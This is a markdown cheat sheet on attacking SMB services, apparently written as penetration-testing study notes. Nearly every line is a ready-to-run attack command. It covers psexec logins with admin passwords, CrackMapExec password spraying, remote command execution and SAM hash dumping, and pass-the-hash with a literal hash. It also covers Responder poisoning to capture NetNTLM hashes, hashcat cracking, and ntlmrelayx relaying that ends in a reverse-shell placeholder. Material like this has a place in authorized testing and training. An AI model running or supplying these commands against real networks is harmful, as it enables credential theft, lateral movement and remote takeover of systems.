# Attacking common services
- [SMB](#smb)
## SMB

- **Impacket PsExec**
    - To connect to a remote machine with a local administrator account, using impacket-psexec, you can use the following command: `impacket-psexec administrator:'Password123!'@10.10.110.17`

- **CrackMapExec**
    - Password Spraying: `crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-auth`
    - Execute Commands: `crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec`
    - Extract Hashes from SAM Database: `crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam`
    - Pass-the-Hash (PtH): `crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE`


> [!NOTE]
> Using the `--continue-on-success` flag, It will continue spraying even after a valid password is found.
> If we are targeting a non-domain joined computer, we will need to use the option `--local-auth`.

### Forced Authentication Attacks
- We can also abuse the SMB protocol by creating a fake SMB Server to capture users' NetNTLM v1/v2 hashes.
- The most common tool to perform such operations is the Responder. 
- Responder is an LLMNR, NBT-NS, and MDNS poisoner tool with different capabilities, one of them is the possibility to set up fake services, including SMB, to steal NetNTLM v1/v2 hashes.
- **Steps**
    - Creating a fake SMB server using the Responder default configuration, with the following command: `responder -I <interface name>`
    - Crack it using the hashcat module 5600.
    - If we cannot crack the hash, we can potentially relay the captured hash to another machine using [impacket-ntlmrelayx](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py) or [Responder MultiRelay.py](https://github.com/lgandx/Responder/blob/master/tools/MultiRelay.py).
        1. We need to set SMB to OFF in our responder configuration file (/etc/responder/Responder.conf): `cat /etc/responder/Responder.conf | grep 'SMB ='`
        2. We execute impacket-ntlmrelayx with the option `--no-http-server`, `-smb2support`, and the target machine with the option `-t`: `impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146`
        3. We can execute commands by adding the option `-c` and get a [reverse shell](https://www.revshells.com/): `impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'REV_SHELL'`
